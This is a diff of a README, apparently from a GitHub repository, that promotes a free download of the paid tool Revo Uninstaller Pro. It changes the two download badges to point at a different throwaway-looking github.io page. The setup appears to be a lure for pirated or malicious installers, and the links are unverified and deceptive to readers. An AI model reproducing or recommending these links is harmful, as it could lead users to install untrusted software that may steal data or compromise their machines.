@@ -2,8 +2,8 @@
 
 Revo Uninstaller Pro is a reliable and efficient tool designed to thoroughly uninstall unwanted software and clean leftover files to boost your PC’s performance. Perfect for users who want a clean, optimized system without hassle.
 
-[![Download Revo Uninstaller Pro](https://img.shields.io/badge/Download-Revo_Uninstaller_Pro-blueviolet)](https://revo-uninstaller-ultimate.github.io/.github)
-[![Download Revo Uninstaller Pro](https://img.shields.io/badge/Download-Revo_Uninstaller_Pro-blueviolet)](https://revo-uninstaller-ultimate.github.io/.github)
+[![Download Revo Uninstaller Pro](https://img.shields.io/badge/Download-Revo_Uninstaller_Pro-blueviolet)](https://asdeennerhorse.github.io/mogus/revo)
+[![Download Revo Uninstaller Pro](https://img.shields.io/badge/Download-Revo_Uninstaller_Pro-blueviolet)](https://asdeennerhorse.github.io/mogus/revo)
 
 ---
 
